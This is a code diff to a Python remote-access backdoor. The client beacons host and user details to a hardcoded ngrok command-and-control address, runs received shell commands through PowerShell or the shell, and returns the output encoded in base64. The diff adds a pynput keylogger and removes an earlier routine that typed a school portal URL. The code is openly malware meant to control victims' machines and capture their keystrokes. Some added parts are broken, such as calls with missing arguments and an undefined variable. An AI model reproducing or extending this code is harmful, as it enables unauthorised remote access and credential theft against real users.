@@ -12,12 +12,27 @@ import threading
 import subprocess
 import base64
 import pynput
+from pynput import keyboard
 
 # If the free version of ngrok is used, the port will change each time ngrok is activated
 address = "0.tcp.jp.ngrok.io" # address
 port = 18642 # port 
+keyStorage = {} # Dictionary to store keystrokes for keylogging for every user
 
+# Helper for pynput keylogging, writes the keystrokes to a file in the current working directory of the user.
+# Handles AttributeError by writing "Special key: "
+def on_press(key, sock):
+    try:
+      keyStorage[sock] += str(key())
+    except AttributeError:
+      with open(os.path.join(userCWD, "keylog.txt"), "a") as log_file:
+        log_file.write(f"Special key: {str(key)}")
+        log_file.close()
 
+def start_keylogger(sock):
+  keyStorage[sock] = ""
+  with keyboard.Listener(on_press=on_press) as listener:
+    listener.join()
 # Handles the connection of the client to the C2 server through the socket library and tcp server. 
 # Preconditions: Valid address and socket, ngrok tcp port is open
 # Postconditions: Machine is connected to the C2 server, handler thread is wokring, the machine sends its information via send_beacon
@@ -44,8 +59,8 @@ def connect_client():
 # Precondtions: Valid socket
 # Postconditions: output is encoded into bytes and sent through the socket
 def send_beacon(sock):
-    beacon = f"BKDR_ALIVE|{platform.node()}|{getpass.getuser()}|{'ADMIN' if os.name=='nt' else 'USER'}|{platform.system()}"
-    sock.send(beacon.encode("utf-8"))
+  beacon = f"BKDR_ALIVE|{platform.node()}|{getpass.getuser()}|{'ADMIN' if os.name=='nt' else 'USER'}|{platform.system()}"
+  sock.send(beacon.encode("utf-8"))
 
 
 
@@ -58,45 +73,45 @@ def send_beacon(sock):
 # Postconditions: The command is executed and the output is sent back to the user 
 def execute_command(command, sock):
     try:
-        #Keylogging command
-        if command.startswith("KEYLOG"):
-          keyboard = pynput.keyboard.Controller()
-          keyboard.press(pynput.keyboard.Key.cmd)
-          keyboard.press('l')
-          keyboard.release(pynput.keyboard.Key.cmd)
-          keyboard.release('l')
-          keyboard.type('https://asij.edsby.com/')
-          keyboard.press(pynput.keyboard.Key.enter)
-          keyboard.release(pynput.keyboard.Key.enter)
-        # Special handling for "cd" command
-        if command.startswith("cd "):
-            try:
-                os.chdir(command[3:].strip())
-                result = f"[{os.getcwd()}]"
-            except Exception as e:
-                result = f"Error changing directory: {e}"
+      #Keylogging command
+      # Approach: Create a string that logs all the keystrokes, then send the string back to the user periodically.
+      keyStrokes = ""
+      if command.startswith("KEYLOG_START"):
+        result = "CMD_RES|Keylogging started"
+        start_keylogger()
+      if command.startswith("KEYLOG_STOP"):
         
-        # Normal shell commands (whoami, hostname, ipconfig, dir, etc.)
-        else:
-            if os.name == "nt":
-                result_obj = subprocess.run(["powershell", "-Command", command], 
-                                            capture_output=True, timeout=15, text=True)
-            else:
-                result_obj = subprocess.run(command, shell=True, capture_output=True, timeout=15, text=True)
-            
-            result = result_obj.stdout + result_obj.stderr
-            if not result.strip():
-                result = "(No output)"
+        result = "CMD_RES|Keylogging stopped"
 
-        # Send output back to listener
-        encoded = base64.b64encode(result.encode("utf-8")).decode("utf-8")
-        sock.send(f"CMD_RES|{encoded}".encode("utf-8"))
-        print(f"[+] Executed: {command}")
+      # Special handling for "cd" command
+      if command.startswith("cd "):
+        try:
+          os.chdir(command[3:].strip())
+          result = f"[{os.getcwd()}]"
+        except Exception as e:
+          result = f"Error changing directory: {e}"
+      
+      # Normal shell commands (whoami, hostname, ipconfig, dir, etc.)
+      else:
+        if os.name == "nt":
+          result_obj = subprocess.run(["powershell", "-Command", command], 
+                                        capture_output=True, timeout=15, text=True)
+        else:
+          result_obj = subprocess.run(command, shell=True, capture_output=True, timeout=15, text=True)
+        
+        result = result_obj.stdout + result_obj.stderr
+        if not result.strip():
+          result = "(No output)"
+
+      # Send output back to listener
+      encoded = base64.b64encode(result.encode("utf-8")).decode("utf-8")
+      sock.send(f"CMD_RES|{encoded}".encode("utf-8"))
+      print(f"[+] Executed: {command}")
 
     except subprocess.TimeoutExpired:
-        sock.send(b"CMD_ERR|Command timed out")
+      sock.send(b"CMD_ERR|Command timed out")
     except Exception as e:
-        sock.send(f"CMD_ERR|Error: {str(e)}".encode("utf-8"))
+      sock.send(f"CMD_ERR|Error: {str(e)}".encode("utf-8"))
 
 # Handles the command that is received by the user/listener. Using data to collect the input of the user, this function handles the 
 # tranasition between the user and the function execute)command) through reformatting of the input. If there is an error, it
@@ -105,14 +120,14 @@ def execute_command(command, sock):
 # Postconditions: execute_command is functioning or the print statement is printed
 def command_handler(sock):
   while True:
-      try:
-          data = sock.recv(4096)
-          if not data: break
-          cmd = data.decode("utf-8", errors="ignore").strip()
-          execute_command(cmd, sock)
-      except Exception as e:
-          print(f'[*] Error receiving data: {e}')
-          break
+    try:
+      data = sock.recv(4096)
+      if not data: break
+      cmd = data.decode("utf-8", errors="ignore").strip()
+      execute_command(cmd, sock)
+    except Exception as e:
+      print(f'[*] Error receiving data: {e}')
+      break
 
 
 
